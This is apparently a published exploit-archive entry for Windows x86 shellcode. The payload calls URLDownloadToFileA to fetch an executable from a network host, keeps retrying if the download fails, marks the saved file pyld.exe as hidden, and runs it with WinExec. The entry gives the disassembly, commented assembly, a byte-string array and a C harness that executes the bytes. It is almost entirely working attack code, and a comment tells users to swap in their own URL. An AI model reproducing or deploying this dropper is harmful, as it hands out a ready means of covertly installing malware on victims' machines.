/*
	Title : Windows x86 URLDownloadToFileA()+SetFileAttributesA()+WinExec()+ExitProcess() shellcode
	Date : 12-07-2016
	Author : Roziul Hasan Khan Shifat
	Tested on: Windows 7 x86


*/

/*


Disassembly of section .text:

00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	64 8b 41 30          	mov    %fs:0x30(%ecx),%eax
   6:	8b 40 0c             	mov    0xc(%eax),%eax
   9:	8b 70 14             	mov    0x14(%eax),%esi
   c:	ad                   	lods   %ds:(%esi),%eax
   d:	96                   	xchg   %eax,%esi
   e:	ad                   	lods   %ds:(%esi),%eax
   f:	8b 48 10             	mov    0x10(%eax),%ecx
  12:	8b 59 3c             	mov    0x3c(%ecx),%ebx
  15:	01 cb                	add    %ecx,%ebx
  17:	8b 5b 78             	mov    0x78(%ebx),%ebx
  1a:	01 cb                	add    %ecx,%ebx
  1c:	8b 73 20             	mov    0x20(%ebx),%esi
  1f:	01 ce                	add    %ecx,%esi
  21:	31 d2                	xor    %edx,%edx

00000023 <count>:
  23:	42                   	inc    %edx
  24:	ad                   	lods   %ds:(%esi),%eax
  25:	01 c8                	add    %ecx,%eax
  27:	81 38 47 65 74 50    	cmpl   $0x50746547,(%eax)
  2d:	75 f4                	jne    23 <count>
  2f:	81 78 04 72 6f 63 41 	cmpl   $0x41636f72,0x4(%eax)
  36:	75 eb                	jne    23 <count>
  38:	81 78 08 64 64 72 65 	cmpl   $0x65726464,0x8(%eax)
  3f:	75 e2                	jne    23 <count>
  41:	8b 73 1c             	mov    0x1c(%ebx),%esi
  44:	01 ce                	add    %ecx,%esi
  46:	8b 14 96             	mov    (%esi,%edx,4),%edx
  49:	01 ca                	add    %ecx,%edx
  4b:	31 f6                	xor    %esi,%esi
  4d:	89 d6                	mov    %edx,%esi
  4f:	89 cf                	mov    %ecx,%edi
  51:	31 c0                	xor    %eax,%eax
  53:	50                   	push   %eax
  54:	68 61 72 79 41       	push   $0x41797261
  59:	68 4c 69 62 72       	push   $0x7262694c
  5e:	68 4c 6f 61 64       	push   $0x64616f4c
  63:	54                   	push   %esp
  64:	51                   	push   %ecx
  65:	ff d2                	call   *%edx
  67:	83 c4 0c             	add    $0xc,%esp
  6a:	31 c9                	xor    %ecx,%ecx
  6c:	68 6c 6c 41 41       	push   $0x41416c6c
  71:	88 4c 24 02          	mov    %cl,0x2(%esp)
  75:	68 6f 6e 2e 64       	push   $0x642e6e6f
  7a:	68 75 72 6c 6d       	push   $0x6d6c7275
  7f:	54                   	push   %esp
  80:	ff d0                	call   *%eax
  82:	83 c4 0c             	add    $0xc,%esp
  85:	31 c9                	xor    %ecx,%ecx
  87:	68 65 41 42 42       	push   $0x42424165
  8c:	88 4c 24 02          	mov    %cl,0x2(%esp)
  90:	68 6f 46 69 6c       	push   $0x6c69466f
  95:	68 6f 61 64 54       	push   $0x5464616f
  9a:	68 6f 77 6e 6c       	push   $0x6c6e776f
  9f:	68 55 52 4c 44       	push   $0x444c5255
  a4:	54                   	push   %esp
  a5:	50                   	push   %eax
  a6:	ff d6                	call   *%esi
  a8:	83 c4 14             	add    $0x14,%esp
  ab:	50                   	push   %eax

000000ac <download>:
  ac:	58                   	pop    %eax
  ad:	31 c9                	xor    %ecx,%ecx
  af:	51                   	push   %ecx
  b0:	68 2e 65 78 65       	push   $0x6578652e
  b5:	68 6d 70 6c 65       	push   $0x656c706d
  ba:	68 30 2f 73 61       	push   $0x61732f30
  bf:	68 36 2e 31 33       	push   $0x33312e36
  c4:	68 36 38 2e 38       	push   $0x382e3836
  c9:	68 39 32 2e 31       	push   $0x312e3239
  ce:	68 3a 2f 2f 31       	push   $0x312f2f3a
  d3:	68 68 74 74 70       	push   $0x70747468
  d8:	54                   	push   %esp
  d9:	59                   	pop    %ecx
  da:	31 db                	xor    %ebx,%ebx
  dc:	53                   	push   %ebx
  dd:	68 2e 65 78 65       	push   $0x6578652e
  e2:	68 70 79 6c 64       	push   $0x646c7970
  e7:	54                   	push   %esp
  e8:	5b                   	pop    %ebx
  e9:	31 d2                	xor    %edx,%edx
  eb:	50                   	push   %eax
  ec:	52                   	push   %edx
  ed:	52                   	push   %edx
  ee:	53                   	push   %ebx
  ef:	51                   	push   %ecx
  f0:	52                   	push   %edx
  f1:	ff d0                	call   *%eax
  f3:	59                   	pop    %ecx
  f4:	83 c4 2c             	add    $0x2c,%esp
  f7:	31 d2                	xor    %edx,%edx
  f9:	39 d0                	cmp    %edx,%eax
  fb:	51                   	push   %ecx
  fc:	75 ae                	jne    ac <download>
  fe:	5a                   	pop    %edx
  ff:	31 d2                	xor    %edx,%edx
 101:	68 73 41 42 42       	push   $0x42424173
 106:	88 54 24 02          	mov    %dl,0x2(%esp)
 10a:	68 62 75 74 65       	push   $0x65747562
 10f:	68 74 74 72 69       	push   $0x69727474
 114:	68 69 6c 65 41       	push   $0x41656c69
 119:	68 53 65 74 46       	push   $0x46746553
 11e:	54                   	push   %esp
 11f:	57                   	push   %edi
 120:	ff d6                	call   *%esi
 122:	83 c4 14             	add    $0x14,%esp
 125:	31 c9                	xor    %ecx,%ecx
 127:	51                   	push   %ecx
 128:	68 2e 65 78 65       	push   $0x6578652e
 12d:	68 70 79 6c 64       	push   $0x646c7970
 132:	54                   	push   %esp
 133:	59                   	pop    %ecx
 134:	31 d2                	xor    %edx,%edx
 136:	83 c2 02             	add    $0x2,%edx
 139:	52                   	push   %edx
 13a:	51                   	push   %ecx
 13b:	ff d0                	call   *%eax
 13d:	83 c4 08             	add    $0x8,%esp
 140:	31 c9                	xor    %ecx,%ecx
 142:	68 78 65 63 41       	push   $0x41636578
 147:	88 4c 24 03          	mov    %cl,0x3(%esp)
 14b:	68 57 69 6e 45       	push   $0x456e6957
 150:	54                   	push   %esp
 151:	57                   	push   %edi
 152:	ff d6                	call   *%esi
 154:	83 c4 08             	add    $0x8,%esp
 157:	31 c9                	xor    %ecx,%ecx
 159:	51                   	push   %ecx
 15a:	68 2e 65 78 65       	push   $0x6578652e
 15f:	68 70 79 6c 64       	push   $0x646c7970
 164:	54                   	push   %esp
 165:	59                   	pop    %ecx
 166:	31 d2                	xor    %edx,%edx
 168:	52                   	push   %edx
 169:	51                   	push   %ecx
 16a:	ff d0                	call   *%eax
 16c:	83 c4 08             	add    $0x8,%esp
 16f:	31 c9                	xor    %ecx,%ecx
 171:	68 65 73 73 41       	push   $0x41737365
 176:	88 4c 24 03          	mov    %cl,0x3(%esp)
 17a:	68 50 72 6f 63       	push   $0x636f7250
 17f:	68 45 78 69 74       	push   $0x74697845
 184:	54                   	push   %esp
 185:	57                   	push   %edi
 186:	ff d6                	call   *%esi
 188:	ff d0                	call   *%eax


*/



/*

section .text
	global _start
_start:

xor ecx,ecx
mov eax,[fs:ecx+0x30] ;Eax=PEB
mov eax,[eax+0xc] ;eax=PEB.Ldr
mov esi,[eax+0x14] ;esi=PEB.Ldr->InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov ecx,[eax+0x10] ;ecx=kernel32.dll base address
;------------------------------------

mov ebx,[ecx+0x3c] ;kernel32.dll +0x3c=DOS->e_flanew
add ebx,ecx ;ebx=PE HEADER
mov ebx,[ebx+0x78];Data_DIRECTORY->VirtualAddress
add ebx,ecx ;IMAGE_EXPORT_DIRECTORY

mov esi,[ebx+0x20] ;AddressOfNames
add esi,ecx
;------------------------------------------
xor edx,edx

count:
inc edx
lodsd
add eax,ecx
cmp dword [eax],'GetP'
jnz count
cmp dword [eax+4],'rocA'
jnz count
cmp dword [eax+8],'ddre'
jnz count

;---------------------------------------------

mov esi,[ebx+0x1c] ;AddressOfFunctions
add esi,ecx

mov edx,[esi+edx*4]
add edx,ecx ;edx=GetProcAddress()

;-----------------------------------------

xor esi,esi
mov esi,edx ;GetProcAddress()
mov edi,ecx ;kernel32.dll

;------------------------------------
;finding address of LoadLibraryA()
xor eax,eax
push eax
push 0x41797261
push 0x7262694c
push 0x64616f4c

push esp
push ecx

call edx

;------------------------
add esp,12
;-----------------------------

;LoadLibraryA("urlmon.dll")
xor ecx,ecx

push 0x41416c6c
mov [esp+2],byte cl
push 0x642e6e6f
push 0x6d6c7275

push esp
call eax

;-----------------------

add esp,12
;-----------------------
;finding address of URLDownloadToFileA()
xor ecx,ecx
push 0x42424165
mov [esp+2],byte cl
push 0x6c69466f
push 0x5464616f
push 0x6c6e776f
push 0x444c5255

push esp
push eax
call esi

;------------------------
add esp,20
push eax
;---------------------------------------
;URLDownloadToFileA(NULL,url,save as,0,NULL)
download:
pop eax
xor ecx,ecx
push ecx

;-----------------------------
;change it to file url

push 0x6578652e
push 0x656c706d
push 0x61732f30
push 0x33312e36
push 0x382e3836
push 0x312e3239
push 0x312f2f3a
push 0x70747468
;-----------------------------------


push esp
pop ecx ;url http://192.168.86.130/sample.exe

xor ebx,ebx
push ebx

;------------------------
;save as (no need change it.if U want to change it,do it)
push 0x6578652e
push 0x646c7970
;-------------------------------
push esp ;pyld.exe
pop ebx ;save as

xor edx,edx
push eax
push edx
push edx
push ebx
push ecx
push edx

call eax

;-------------------------

pop ecx
add esp,44
xor edx,edx
cmp eax,edx
push ecx
jnz download ;if it fails to download , retry contineusly
;------------------
pop edx

;-----------------------
;Finding address of SetFileAttributesA()
xor edx,edx


push 0x42424173
mov [esp+2],byte dl
push 0x65747562
push 0x69727474
push 0x41656c69
push 0x46746553

push esp
push edi

call esi

;--------------------------------

add esp,20 ;U must adjust stack or it will crash
;--------------------
;calling SetFileAttributesA("pyld.exe",FILE_ATTRIBUTE_HIDDEN)
xor ecx,ecx
push ecx
push 0x6578652e
push 0x646c7970

push esp
pop ecx

xor edx,edx
add edx,2 ;FILE_ATTRIBUTE_HIDDEN

push edx
push ecx

call eax

;-------------------

add esp,8
;---------------------------

;finding address of WinExec()
xor ecx,ecx

push 0x41636578
mov [esp+3],byte cl
push 0x456e6957

push esp
push edi
call esi

;----------------------

add esp,8

;------------------------
;calling WinExec("pyld.exe",0)
xor ecx,ecx
push ecx
push 0x6578652e
push 0x646c7970

push esp
pop ecx

xor edx,edx
push edx
push ecx

call eax
;-------------------------

add esp,8
;-----------------------------

;finding address of ExitProcess()
xor ecx,ecx
push 0x41737365
mov [esp+3],byte cl
push 0x636f7250
push 0x74697845

push esp
push edi

call esi

;--------------
call eax



*/

#include<stdio.h>
#include<string.h>

char shellcode[]="\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x48\x10\x8b\x59\x3c\x01\xcb\x8b\x5b\x78\x01\xcb\x8b\x73\x20\x01\xce\x31\xd2\x42\xad\x01\xc8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x73\x1c\x01\xce\x8b\x14\x96\x01\xca\x31\xf6\x89\xd6\x89\xcf\x31\xc0\x50\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x51\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x6c\x6c\x41\x41\x88\x4c\x24\x02\x68\x6f\x6e\x2e\x64\x68\x75\x72\x6c\x6d\x54\xff\xd0\x83\xc4\x0c\x31\xc9\x68\x65\x41\x42\x42\x88\x4c\x24\x02\x68\x6f\x46\x69\x6c\x68\x6f\x61\x64\x54\x68\x6f\x77\x6e\x6c\x68\x55\x52\x4c\x44\x54\x50\xff\xd6\x83\xc4\x14\x50\x58\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x6d\x70\x6c\x65\x68\x30\x2f\x73\x61\x68\x36\x2e\x31\x33\x68\x36\x38\x2e\x38\x68\x39\x32\x2e\x31\x68\x3a\x2f\x2f\x31\x68\x68\x74\x74\x70\x54\x59\x31\xdb\x53\x68\x2e\x65\x78\x65\x68\x70\x79\x6c\x64\x54\x5b\x31\xd2\x50\x52\x52\x53\x51\x52\xff\xd0\x59\x83\xc4\x2c\x31\xd2\x39\xd0\x51\x75\xae\x5a\x31\xd2\x68\x73\x41\x42\x42\x88\x54\x24\x02\x68\x62\x75\x74\x65\x68\x74\x74\x72\x69\x68\x69\x6c\x65\x41\x68\x53\x65\x74\x46\x54\x57\xff\xd6\x83\xc4\x14\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x70\x79\x6c\x64\x54\x59\x31\xd2\x83\xc2\x02\x52\x51\xff\xd0\x83\xc4\x08\x31\xc9\x68\x78\x65\x63\x41\x88\x4c\x24\x03\x68\x57\x69\x6e\x45\x54\x57\xff\xd6\x83\xc4\x08\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x70\x79\x6c\x64\x54\x59\x31\xd2\x52\x51\xff\xd0\x83\xc4\x08\x31\xc9\x68\x65\x73\x73\x41\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\xff\xd6\xff\xd0";

main()
{
printf("shellcode length %ld\n",(long)strlen(shellcode));
(* (int(*)()) shellcode) ();
}